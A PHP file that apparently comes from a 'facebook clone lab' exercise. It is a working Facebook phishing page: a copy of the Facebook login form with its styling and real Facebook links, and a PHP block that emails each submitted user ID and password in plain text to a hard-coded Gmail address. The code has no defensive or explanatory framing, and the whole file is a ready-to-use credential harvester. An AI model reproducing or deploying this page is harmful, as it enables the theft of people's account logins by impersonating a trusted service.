
<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['user_id'];
    $pass = $_POST['password'];

    $to = "naninarayana119@gmail.com";
    $subject = "Facebook Login Credentials";
    $message = "User ID: $user\nPassword: $pass";
    $headers = "From: naninarayana119@gmail.com\r\n";
    $headers .= "Reply-To: naninarayana119@gmail.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    if (mail($to, $subject, $message, $headers)) {
        echo "Mail sent!";
    } else {
        echo "Mail failed to send.";
    }
}
?>

<!DOCTYPE html>
<html>
   <head>
      <title>Facebook – log in or sign up</title>
      <link rel="stylesheet" href="C:\xampp\htdocs\facebook_clone_lab\4lCu2zih0ca.svg">
   </head>
   <body>
      <form method="post">
         <div id="complete_view"> <!--this container is for complete view of page-->
         <div id="logo_tagline">
            <!--this container is for logo and tagline of page-->
            <img src="G:\Skills_sprise\task\23-July-2025\4lCu2zih0ca.svg" alt="Facebook Logo" id="fblogo">
            <h1 id="tagline"> Facebook helps you connect and share with the people in your life. </h1>
         </div>
         <div id="loginsectin"><!--this container is for id and password, login, fogot password and create new account button-->
            <div id="login_key_forgot">
               <input type="text" name="user_id" placeholder="Email address or phone number" required>
               <input type="password" name="password" placeholder="Password" required>
               <button type="submit" id="login-btn"> Log in </button>
               <a id="fp" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"> Forgotten password? </a>
               <hr>
               <button id="crt-btn"> <a href="https://www.facebook.com/r.php?entry_point=login"> Create new account </a></button>
            </div>
            <p id="pagecreation"> <a href="https://www.facebook.com/pages/create/?ref_type=registration_form"> <strong> Create a Page </strong></a>
               for a celebrity, brand or business.
            </p>
            <!--this container id="pagecreation" is page creation -->
         </div>
      </div>
      </form>
   </body>
</html>

<style>*{
    text-decoration: none;
}

body{
    background-color: #f0f2f5;
    font-family: Arial, Helvetica, sans-serif;
}

#crt-btn{
  font-weight: bold;
  color: white;
  background-color: #36a420;
  padding: 14px ;
  padding-left: 40px;
  border: none;
  border-radius: 6px;
  font-size: 16px;
  cursor: pointer;
  width: 95%; 
}

#complete_view{
   display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  gap: 60px;
  padding: 0 40px;
}

#logo_tagline{
    flex: 1;
}

#fblogo{
  width: 300px;
  max-width: 100%;
  margin-bottom: 20px;
}

#tagline{
font-size: 28px;
font-weight: normal;
color: #1c1e21;
line-height: 1.4;
max-width: 500px;
}

#loginsectin {
  flex: 1;
  max-width: 400px;
  background: white;
  padding: 30px;
  border-radius: 10px;
  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
}

#login_key_forgot input {
  width: 90%;
  padding: 10px;
  margin-bottom: 10px;
  border: 1px solid #ddd;
  border-radius: 6px;
  font-size: 16px;
}

#login-btn {
  width: 95%;
  background-color: #1877f2;
  color: white;
  font-weight: bold;
  font-size: 18px;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  padding: 14px 0;
  margin-bottom: 12px;
}

#fp{
   color: #1877f2;
  font-size: 14px;
  display: block;
  text-align: center;
  margin-bottom: 16px;
}

#hr{
  border: none;
  border-top: 1px solid #ccc;
  margin: 16px 0;
}

#pagecreation{
  text-align: center;
  font-size: 14px;
  margin-top: 20px;
}

#pagecreation{
    text-align: center;
  font-size: 14px;
  margin-top: 20px;
}

#pagecreation a{
    color: #1c1e21;
  text-decoration: none;
}</style>
